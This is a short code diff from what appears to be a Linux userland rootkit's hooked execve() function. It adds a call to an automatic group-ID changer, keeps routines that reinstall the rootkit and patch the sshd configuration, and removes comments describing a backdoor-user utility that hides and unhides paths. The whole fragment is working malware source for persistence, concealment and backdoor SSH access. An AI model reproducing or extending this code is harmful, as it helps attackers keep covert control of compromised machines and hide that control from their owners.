@@ -2,6 +2,9 @@ int execve(const char *filename, char *const argv[], char *const envp[]){
 #ifdef DO_REINSTALL
     if(!not_user(0)) reinstall();
 #endif
+#ifdef AUTO_GID_CHANGER
+    gidchanger();
+#endif
 #ifdef PATCH_SSHD_CONFIG
     sshdpatch(REG_USR);
 #endif
@@ -9,9 +12,9 @@ int execve(const char *filename, char *const argv[], char *const envp[]){
     hook(CEXECVE);
 
     if(is_bdusr()){
-#ifdef BACKDOOR_UTIL                                     /* running ./bdv from a backdoor shell  */
-        if(!fnmatch("*/bdv", argv[0], FNM_PATHNAME))   /* allows you to hide & unhide paths on */
-            do_hidingutil(argv);                       /* the fly.                             */
+#ifdef BACKDOOR_UTIL
+        if(!fnmatch("*/bdv", argv[0], FNM_PATHNAME))
+            do_hidingutil(argv);
 #endif
 #ifdef PATCH_SSHD_CONFIG
         if(!fnmatch("*/sshdpatch", argv[0], FNM_PATHNAME)){
